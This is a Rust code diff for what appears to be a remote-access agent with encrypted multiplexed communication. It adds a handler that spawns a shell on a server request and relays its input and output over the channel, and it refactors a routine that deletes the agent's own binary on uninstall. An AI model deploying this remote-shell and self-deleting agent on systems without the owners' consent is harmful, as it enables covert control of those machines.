@@ -10,11 +10,13 @@ use shared::{
     error::NetworkError,
     multiplexing::{MIN_DATA_STREAM_ID, StreamId},
     packets::{
-        AgentInstruction, Packet, Packets, StreamClose, StreamData, StreamOpen, from_packet_bytes,
+        AgentInstruction, Packet, Packets, ShellRequest, StreamClose, StreamData, StreamOpen,
+        from_packet_bytes,
     },
 };
 
 use super::{ReadHalf, WriteHalf, client::Client, stream::Stream};
+use crate::shell::ShellSession;
 use shared::encryption::{decrypt, encrypt};
 
 pub struct MultiplexManager {
@@ -59,7 +61,8 @@ impl MultiplexManager {
 
     /// Attempt to delete the agent binary.
     /// This is called when an uninstall shutdown is requested.
-    fn self_delete() {
+    #[allow(clippy::unused_self)]
+    fn self_delete(&self) {
         use std::env;
         use std::fs;
 
@@ -108,6 +111,116 @@ impl MultiplexManager {
                 eprintln!("Binary deleted successfully");
             }
         }
+    }
+
+    fn handle_shell_request(
+        self: &Arc<Self>,
+        shell_req: &ShellRequest,
+    ) -> Result<(), NetworkError> {
+        eprintln!("Shell request received: {:?}", shell_req.shell_type);
+
+        // Spawn the shell session
+        let shell_session = ShellSession::spawn(shell_req.shell_type)?;
+        let (stdin, mut stdout, mut process) = shell_session.into_parts();
+
+        // Wrap stdin in Arc<Mutex> for sharing between threads
+        let stdin = Arc::new(Mutex::new(stdin));
+
+        // Open a stream for this shell session
+        let stream_id = self.next_id.fetch_add(1, Ordering::SeqCst);
+        let (stream_tx, stream_rx) = channel::unbounded();
+
+        {
+            let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
+            streams.insert(stream_id, stream_tx);
+        }
+
+        let open_packet = StreamOpen { stream_id };
+        self.send_packet(&open_packet.serialize()?)?;
+
+        eprintln!("Shell stream opened: {stream_id}");
+
+        // Spawn thread to read shell output and send to stream
+        let self_clone = self.clone();
+        thread::spawn(move || {
+            use std::io::Read;
+
+            let mut buffer = vec![0u8; 4096];
+            loop {
+                // Check if process is still running
+                match process.try_wait() {
+                    Ok(Some(_)) => {
+                        eprintln!("Shell process exited");
+                        let close_packet = StreamClose { stream_id };
+                        let _ = self_clone.send_packet(&close_packet.serialize().unwrap());
+                        break;
+                    }
+                    Ok(None) => {
+                        // Process still running, try to read
+                        match stdout.read(&mut buffer) {
+                            Ok(0) => {
+                                // EOF
+                                eprintln!("Shell stdout closed");
+                                let close_packet = StreamClose { stream_id };
+                                let _ = self_clone.send_packet(&close_packet.serialize().unwrap());
+                                break;
+                            }
+                            Ok(n) => {
+                                let data_packet = StreamData {
+                                    stream_id,
+                                    data: buffer[..n].to_vec(),
+                                };
+                                if let Err(e) =
+                                    self_clone.send_packet(&data_packet.serialize().unwrap())
+                                {
+                                    eprintln!("Failed to send shell output: {e}");
+                                    break;
+                                }
+                            }
+                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                                // No data available, continue
+                                std::thread::sleep(std::time::Duration::from_millis(10));
+                            }
+                            Err(e) => {
+                                eprintln!("Error reading shell output: {e}");
+                                break;
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("Error checking process status: {e}");
+                        break;
+                    }
+                }
+            }
+        });
+
+        // Spawn thread to read from stream and write to shell stdin
+        thread::spawn(move || {
+            use std::io::Write;
+
+            while let Ok(data) = stream_rx.recv() {
+                let mut stdin_guard = match stdin.lock() {
+                    Ok(guard) => guard,
+                    Err(e) => {
+                        eprintln!("Failed to lock stdin: {e}");
+                        break;
+                    }
+                };
+
+                if let Err(e) = stdin_guard.write_all(&data) {
+                    eprintln!("Failed to write to shell stdin: {e}");
+                    break;
+                }
+
+                if let Err(e) = stdin_guard.flush() {
+                    eprintln!("Failed to flush shell stdin: {e}");
+                    break;
+                }
+            }
+        });
+
+        Ok(())
     }
 
     pub fn start(self: &Arc<Self>) -> thread::JoinHandle<()> {
@@ -196,7 +309,7 @@ impl MultiplexManager {
                             // Check if this is an uninstall request
                             if reason.to_lowercase().contains("uninstall") {
                                 eprintln!("Uninstall detected, initiating self-delete...");
-                                Self::self_delete();
+                                self.self_delete();
                             }
 
                             self.shutdown.store(true, Ordering::Relaxed);
@@ -219,6 +332,9 @@ impl MultiplexManager {
                             // TODO: implement resume logic
                         }
                     }
+                }
+                Packets::ShellRequest(shell_req) => {
+                    self.handle_shell_request(&shell_req)?;
                 }
                 _ => {
                     eprintln!("Unexpected packet in multiplex receive loop");
